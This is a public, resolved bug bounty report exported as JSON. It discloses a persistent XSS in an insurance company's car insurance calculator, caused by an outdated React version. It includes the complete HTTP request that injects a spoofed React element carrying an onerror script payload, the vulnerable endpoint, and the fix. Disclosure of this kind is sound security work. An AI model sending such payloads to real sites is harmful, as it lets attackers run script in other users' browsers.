{
  "id": 139004,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzkwMDQ=",
  "url": "https://hackerone.com/reports/139004",
  "title": "Persistent XSS at verkkopalvelu.tapiola.fi using spoofed React element and React v.0.13.3",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-05-15T21:21:03.025Z",
  "submitted_at": "2016-05-15T21:21:03.025Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "fransrosen",
    "url": "/fransrosen",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 8416,
    "url": "https://hackerone.com/localtapiola",
    "handle": "localtapiola",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "LocalTapiola",
      "twitter_handle": "",
      "website": "http://www.lahitapiola.fi",
      "about": "LocalTapiolaâ€™s products and services cover non-life, life and pension insurance, as well as investment and saving services."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2016-06-27T22:32:08.453Z",
  "bug_reporter_agreed_on_going_public_at": "2016-06-27T22:32:08.376Z",
  "team_member_agreed_on_going_public_at": "2016-06-27T22:26:59.450Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi,\n\n## Background\nI noticed that the app at:\nhttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/\n\nwas running an old version of React. In this version (0.13.3) there's an issue, initially discovered by @danlec actually on HackerOne: http://danlec.com/blog/xss-via-a-spoofed-react-element \n\nThe patch by React was made in version 0.14: https://facebook.github.io/react/blog/2015/10/07/react-v0.14.html\n\n## PoC\n\nSo I noticed that the application had a possible way to save a registration in the middle of the process, being able to get an URL to continue with the registration. This save would make a call that looked like this:\n\n```\nPOST /e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/ HTTP/1.1\nHost: verkkopalvelu.lahitapiola.fi\nContent-Type: application/json\n\n{\n    \"79rtwta5z4hjkn3npvu5ak0521\": {\n        \"dateOfIntroduction\": {\n            \"isValid\": true, \n            \"error\": \"\", \n...\n}\n```\n\nThis would then respond with a unique identifier:\n```\n{\"id\":\"ID\"}\n```\nThis data would then be used, if you used a link formatted like this:\nhttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/ID\n\nThe problem, apart from running an old version of React, is that the JSON being saved is not controlled in any way what content it has, which means you're able to extend the JSON further. Now, the content in the elements are being placed inside the DOM of the page, especially the `\"error\"`-element.\n\nSo, to use @danlec's way to inject a spoofed React element, we use the following request:\n\n```\nPOST /e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/ HTTP/1.1\nHost: verkkopalvelu.lahitapiola.fi\nConnection: keep-alive\nContent-Length: 875\nAccept: application/json, text/javascript\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\nCookie: caruid=fd20a9cb-5d40-4127-8858-ca2961bdb789;\n\n{\"79rtwta5z4hjkn3npvu5ak0521\":{\"postCode\":{\"isValid\":true,\"error\":{\"_store\":{},\"type\":\"body\",\"props\":{\"dangerouslySetInnerHTML\":{\"__html\":\"<img src=x onerror=alert(document.domain)>\"}},\"_isReactElement\":true},\"value\":\"jjj\"},\"dateOfIntroduction\":{\"isValid\":true,\"error\":\"\",\"value\":\"JAJAJA\"},\"cylinderCapacity\":{\"isValid\":true,\"error\":\"\",\"value\":\"yyy\"},\"manufacturerCode\":{\"isValid\":true,\"error\":\"\",\"value\":\"zzz\"},\"netPower\":{\"isValid\":true,\"error\":\"\",\"value\":\"bbb\"},\"birthDate\":{\"isValid\":true,\"error\":\"\",\"value\":\"11.11.2011xxx\"},\"grossWeight\":{\"isValid\":true,\"error\":\"\",\"value\":\"ccc\"},\"carType\":{\"isValid\":true,\"error\":\"\",\"value\":\"x\"},\"isRentedOrLeased\":{\"isValid\":true,\"error\":\"\",\"value\":\"eee\"},\"registrationPart2\":{\"isValid\":true,\"error\":\"\",\"value\":\"fff\"},\"modelCode\":{\"isValid\":true,\"error\":\"\",\"value\":\"ggg\"},\"registrationPart1\":{\"isValid\":true,\"error\":\"\",\"value\":\"hhh\"}}}\n```\n\nYou can see my inserted payload here:\nhttps://verkkopalvelu.lahitapiola.fi/e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/c455cb02-6a14-4767-9c63-eb22d9c16be5\n\nWhich would then result in the following URL using the React app:\nhttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/c455cb02-6a14-4767-9c63-eb22d9c16be5\n\nWhich has the following output in the DOM:\n\n{F94020}\n\nThat results in the javascript running when accessing the page:\n\n{F94022}\n\n## Solution\n\nYou should update the React version to >0.14 (and most likely also change so the structure of the JSON that is getting saved is controlled by you.\n\nRegards,\nFrans",
  "bounty_amount": "300.0",
  "formatted_bounty": "$300",
  "weakness": {
    "id": 60,
    "name": "Cross-site Scripting (XSS) - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 94020,
      "file_name": "Screen_Shot_2016-05-15_at_23.09.13.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/094/020/9bc61b08fed82c63adfa74d759f999c11f462f1a/Screen_Shot_2016-05-15_at_23.09.13.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2016-05-15_at_23.09.13.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2016-05-15_at_23.09.13.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYS6T2T4S%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T121105Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQC%2FRlgMvrp4sI%2BNN%2Bw0e%2BHS%2Fi0X4FFUjwI6hTqAUnQWYQIgPZYpGqRtUrQEdEqyjQ7VWI1A7cqBCtguMbt4YIuIcNIqsQUIcBADGgwwMTM2MTkyNzQ4NDkiDIwmV%2FtI2Z%2BVlVJQOCqOBc7CvK4xINdfRva6PibURBsgRmkDXf%2FsfRb09TcUdBlBFNmKVkxQPEdRC1Mnq1DDtMy%2FcGXOrpRoAxZrwVEpSHxUpZo%2FJRAHbOWAQBUrr1l1gC6t9Ol8wWC7PLi7X%2FD2%2BIDYKaPOL3QSa9PdanrueH6WdeJdiGnGVaFnEkwm%2BHPy%2BNshabbrQKXqkiQ%2FKRYoPLt1dvZ1N24FQHGKbhJBHzJTQzkx7Zrace5bXg%2BJgLt6PscN7h%2BULLdZS9N80mauppM1Bvb6ZAc1mkJWSe0udi0WKGIY51k32kzf%2FZRlsjDjv3wLANMhuaYZxtbiG3WqGDC8fit9fFP3v6IHyuIqz8W%2FJG6NK1zlTj4Bv2ofITBdDLGFFR8yKVIFqByGSOWGgKHI%2Bp%2FU758TaX5fX5ORVjWG5txmLAIp2Ye6HKb1jos9tPe0WwKFf1VXSzM%2BIPDtrwzelzeq1ecGD7Qov%2BE7m6FSNQhrPCH5MWK76q29U5jHq4v9GWkh6dO8IcaXMgC5%2BVrL8P1250J44UPDKtphXTjBb3iA00qdsdp1F%2B%2Fa15Q2N6WK4Zj8yXgSiYj5SqlvrlLooUiEv4FjCaTKJ%2B%2F6X9LlHBvM59P7vynVxy%2FZvv1tVFuE%2B1IJtkjeAr5%2BJZnYlQqnuceFw3MjImSw8YPBpzvy4Syrbl%2FiRlfszmlv0xFykH9Tf1k32eSbbbhd5%2B5c1f0w5Do%2F0wB%2B%2F7HU5grw%2Fsc%2Fa4ONp4AL9dothtFzDI9yrU86H0Tj%2BgA4bfs%2Bq8KiM04Zifmo5%2BSqSn50Vbg%2BbyS%2BCKKHCDlA%2FBvQCMxY1dpo4pqPW8%2FQk9SE5zpcrHezMMGRkJg26Wm6o5Sur%2BuuyvPlmvWPTnE137%2FSashTujC8pqyuBjqxAQugPapY7MCgoHnN3A9t0%2FPfp1FpK4tJONEidbWkGhXB6NA90wXv8DKSeZxQJFUZ19mDVzE0iG0%2BiihjuEoeGetVY82tVdAOUT4mlhJqZaL%2FmnCgfpwcatSd2OhHah3YU4JQGvlArly1nhC20oudJ%2FsRukkppx66K%2BMQZDqC%2BF8kHc8TtamF0NWCg6ZU6SXNGyIAZPkCoGCxc2Yn3P3JIGfWLiNvqDATfN7jYp4Rp1toDQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5d3eddd4a0eb6d63ac83c56e02f7936db2e410a13411b5b617b6c4328a200a07",
      "file_size": 78509,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 94022,
      "file_name": "Screen_Shot_2016-05-15_at_23.00.25.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/094/022/8c7069981da948310e62733c5fe99807a713c5e5/Screen_Shot_2016-05-15_at_23.00.25.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2016-05-15_at_23.00.25.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2016-05-15_at_23.00.25.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYS6T2T4S%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T121105Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQC%2FRlgMvrp4sI%2BNN%2Bw0e%2BHS%2Fi0X4FFUjwI6hTqAUnQWYQIgPZYpGqRtUrQEdEqyjQ7VWI1A7cqBCtguMbt4YIuIcNIqsQUIcBADGgwwMTM2MTkyNzQ4NDkiDIwmV%2FtI2Z%2BVlVJQOCqOBc7CvK4xINdfRva6PibURBsgRmkDXf%2FsfRb09TcUdBlBFNmKVkxQPEdRC1Mnq1DDtMy%2FcGXOrpRoAxZrwVEpSHxUpZo%2FJRAHbOWAQBUrr1l1gC6t9Ol8wWC7PLi7X%2FD2%2BIDYKaPOL3QSa9PdanrueH6WdeJdiGnGVaFnEkwm%2BHPy%2BNshabbrQKXqkiQ%2FKRYoPLt1dvZ1N24FQHGKbhJBHzJTQzkx7Zrace5bXg%2BJgLt6PscN7h%2BULLdZS9N80mauppM1Bvb6ZAc1mkJWSe0udi0WKGIY51k32kzf%2FZRlsjDjv3wLANMhuaYZxtbiG3WqGDC8fit9fFP3v6IHyuIqz8W%2FJG6NK1zlTj4Bv2ofITBdDLGFFR8yKVIFqByGSOWGgKHI%2Bp%2FU758TaX5fX5ORVjWG5txmLAIp2Ye6HKb1jos9tPe0WwKFf1VXSzM%2BIPDtrwzelzeq1ecGD7Qov%2BE7m6FSNQhrPCH5MWK76q29U5jHq4v9GWkh6dO8IcaXMgC5%2BVrL8P1250J44UPDKtphXTjBb3iA00qdsdp1F%2B%2Fa15Q2N6WK4Zj8yXgSiYj5SqlvrlLooUiEv4FjCaTKJ%2B%2F6X9LlHBvM59P7vynVxy%2FZvv1tVFuE%2B1IJtkjeAr5%2BJZnYlQqnuceFw3MjImSw8YPBpzvy4Syrbl%2FiRlfszmlv0xFykH9Tf1k32eSbbbhd5%2B5c1f0w5Do%2F0wB%2B%2F7HU5grw%2Fsc%2Fa4ONp4AL9dothtFzDI9yrU86H0Tj%2BgA4bfs%2Bq8KiM04Zifmo5%2BSqSn50Vbg%2BbyS%2BCKKHCDlA%2FBvQCMxY1dpo4pqPW8%2FQk9SE5zpcrHezMMGRkJg26Wm6o5Sur%2BuuyvPlmvWPTnE137%2FSashTujC8pqyuBjqxAQugPapY7MCgoHnN3A9t0%2FPfp1FpK4tJONEidbWkGhXB6NA90wXv8DKSeZxQJFUZ19mDVzE0iG0%2BiihjuEoeGetVY82tVdAOUT4mlhJqZaL%2FmnCgfpwcatSd2OhHah3YU4JQGvlArly1nhC20oudJ%2FsRukkppx66K%2BMQZDqC%2BF8kHc8TtamF0NWCg6ZU6SXNGyIAZPkCoGCxc2Yn3P3JIGfWLiNvqDATfN7jYp4Rp1toDQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d69919103e2a62fe46870d96f2c9a4fa7e6145894ea17fa460712b01d73cc18d",
      "file_size": 209565,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2016-07-27T22:26:59.513Z",
  "allow_singular_disclosure_after": -238167846.24000895,
  "singular_disclosure_allowed": true,
  "vote_count": 27,
  "voters": [
    "fransrosen",
    "mashoud1122",
    "bogdantcaciuc",
    "jobert",
    "michiel",
    "malcolmx",
    "r3y",
    "zephrfish",
    "lars",
    "jens",
    "and 17 more..."
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 2136,
      "category": "team",
      "content": "##Issue\n\nThe reporter found a flaw in the way JSON data was being handled in the car insurance calculator. There was a verified bug in a 3rd party library, namely React, that was vulnerable. The reporter was able to successfully exploit the flaw and create a persistent XSS. \n\n##Fix\nThe React library was patched.\n\n##Reasoning\nThe severity of the bug was classified as medium as the risk for personal data leak was minimal to nonexistent but the result of the vulnerability was persistent. Exploiting in a real-life scenario still required some way of tricking (e.g. phishing) the user into clicking a specific link. ",
      "user": {
        "id": 60017,
        "username": "localtapiola-thomas",
        "name": "localtapiola-thomas",
        "bio": "LocalTapiola Bug Bounty Coordinator - @tsmalmbe",
        "cleared": false,
        "verified": false,
        "website": "http://www.lahitapiola.fi",
        "location": "Espoo, Finland",
        "created_at": "2016-03-09T13:58:17.117Z",
        "url": "https://hackerone.com/localtapiola-thomas",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
